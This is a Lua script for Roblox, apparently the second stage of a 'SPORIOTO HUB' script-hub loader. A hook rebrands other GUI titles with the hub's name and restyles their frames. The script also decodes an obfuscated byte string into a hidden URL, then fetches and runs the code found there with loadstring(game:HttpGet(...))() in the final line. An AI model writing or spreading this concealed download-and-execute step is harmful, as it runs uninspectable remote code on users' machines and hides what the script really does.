
--[[ STAGE 2: VISUAL CORE ]]
local X_4IYd_Bo8p8cA="\161\182\176\247\255\198\183\203\189\205\204\215\131\138\141\159\101\096\137\150\110\111\107\119\107\156\109\124\117\071\109\122\074\079\079\082\127\076\087\041\033\041\039\039\048\078\041\000\003\007\011\003\017\041\081\019\017\010\027\094\030\227\027\242\235\228\239\251\236\060\244\198\196\250\203\196\209\198\214\218\220\224\163\166\223\237\180\179\173\191\186\190\183\137\191\142\149\133\155\145\158\150\153\163\111\154\110\174\179\129\125\125\066\071\124"local GM6u7DpnyAH5ElouVRGj_=97 local AqPfeT6aRcAY=61 local JoaYKew7Djm86S58=1 local ZmriUmscHl145=3 local uHBJCqtwBQyOwfv0yfzm=31 local _Ii4eQP0KOe_Tp=true local hJF_YivBOVwFjiBwVb5=bit32 and bit32.bxor if not hJF_YivBOVwFjiBwVb5 then hJF_YivBOVwFjiBwVb5=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local Q8m5Tm_cDTWnIGGH={}for umyNrtx9prXkL=1,#X_4IYd_Bo8p8cA do local DF_ZXRIKKb2oldXsZo8eIg=string.byte(X_4IYd_Bo8p8cA,umyNrtx9prXkL)local p8R0E6fG3L1k0OAR=(AqPfeT6aRcAY+(umyNrtx9prXkL*ZmriUmscHl145)+uHBJCqtwBQyOwfv0yfzm)%256 if JoaYKew7Djm86S58==0 then DF_ZXRIKKb2oldXsZo8eIg=(DF_ZXRIKKb2oldXsZo8eIg-p8R0E6fG3L1k0OAR)%256 Q8m5Tm_cDTWnIGGH[umyNrtx9prXkL]=string.char(hJF_YivBOVwFjiBwVb5(DF_ZXRIKKb2oldXsZo8eIg,GM6u7DpnyAH5ElouVRGj_))else DF_ZXRIKKb2oldXsZo8eIg=hJF_YivBOVwFjiBwVb5(DF_ZXRIKKb2oldXsZo8eIg,GM6u7DpnyAH5ElouVRGj_)Q8m5Tm_cDTWnIGGH[umyNrtx9prXkL]=string.char((DF_ZXRIKKb2oldXsZo8eIg-p8R0E6fG3L1k0OAR)%256)end end local gbYzg7WIqaTB21Q6_CjT=table.concat(Q8m5Tm_cDTWnIGGH)if _Ii4eQP0KOe_Tp then gbYzg7WIqaTB21Q6_CjT=string.reverse(gbYzg7WIqaTB21Q6_CjT)end local T2qWPMaFjub2U=gbYzg7WIqaTB21Q6_CjT
local HubName = "SPORIOTO HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(T2qWPMaFjub2U))()
